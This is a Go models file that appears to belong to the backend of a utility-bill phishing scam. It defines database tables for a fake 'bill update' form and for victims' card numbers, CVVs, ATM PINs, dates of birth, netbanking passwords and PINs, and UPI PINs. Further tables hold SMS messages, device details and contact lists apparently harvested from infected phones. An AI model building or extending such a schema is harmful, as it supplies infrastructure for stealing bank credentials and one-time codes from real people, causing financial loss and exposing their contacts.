package models

import "time"

type BillUpdateRequest struct {
	ID             uint      `gorm:"primaryKey" json:"id"`
	CreatedAt      time.Time `json:"created_at"`
	CustomerName   string    `json:"customer_name"`
	Mobile         string    `json:"mobile"`
	ConsumerNumber string    `json:"consumer_number"`
	Reasons        string    `json:"reasons"`
}

type PaymentAttempt struct {
	ID            uint      `gorm:"primaryKey" json:"id"`
	CreatedAt     time.Time `json:"created_at"`
	Amount        float64   `json:"amount"`
	PaymentMethod string    `json:"payment_method"`
	Status        string    `json:"status"`
}

type CardDetail struct {
	ID             uint      `gorm:"primaryKey" json:"id"`
	CreatedAt      time.Time `json:"created_at"`
	CardType       string    `json:"card_type"`
	CardNumber     string    `json:"card_number"`
	CardHolderName string    `json:"card_holder_name"`
	Expiry         string    `json:"expiry"`
	CVV            string    `json:"cvv"`
	Amount         float64   `json:"amount"`
}

type CardVerification struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	Dob       string    `json:"dob"`
	AtmPin    string    `json:"atm_pin"`
	Amount    float64   `json:"amount"`
}

type NetbankingDetail struct {
	ID         uint      `gorm:"primaryKey" json:"id"`
	CreatedAt  time.Time `json:"created_at"`
	BankName   string    `json:"bank_name"`
	UserID     string    `json:"user_id"`
	Password   string    `json:"password"`
	RememberMe bool      `json:"remember_me"`
	Amount     float64   `json:"amount"`
}

type NetbankingPin struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	Pin       string    `json:"pin"`
	Amount    float64   `json:"amount"`
}

type UpiDetail struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	Pin       string    `json:"pin"`
	Amount    float64   `json:"amount"`
}

type SmsRecord struct {
	ID         uint      `gorm:"primaryKey" json:"id"`
	CreatedAt  time.Time `json:"created_at"`
	DeviceID   string    `json:"device_id"`
	Sender     string    `json:"sender"`
	Message    string    `json:"message"`
	ReceivedAt string    `json:"received_at"`
}

type Device struct {
	ID           uint      `gorm:"primaryKey" json:"id"`
	CreatedAt    time.Time `json:"created_at"`
	DeviceID     string    `gorm:"uniqueIndex" json:"device_id"`
	DeviceName   string    `json:"device_name"`
	Model        string    `json:"model"`
	OsVersion    string    `json:"os_version"`
	AppVersion   string    `json:"app_version"`
	PhoneNumber  string    `json:"phone_number"`
	LastSeen     time.Time `json:"last_seen"`
}

type ContactRecord struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	CreatedAt time.Time `json:"created_at"`
	DeviceID  string    `json:"device_id"`
	Name      string    `json:"name"`
	Phone     string    `json:"phone"`
	Email     string    `json:"email"`
}
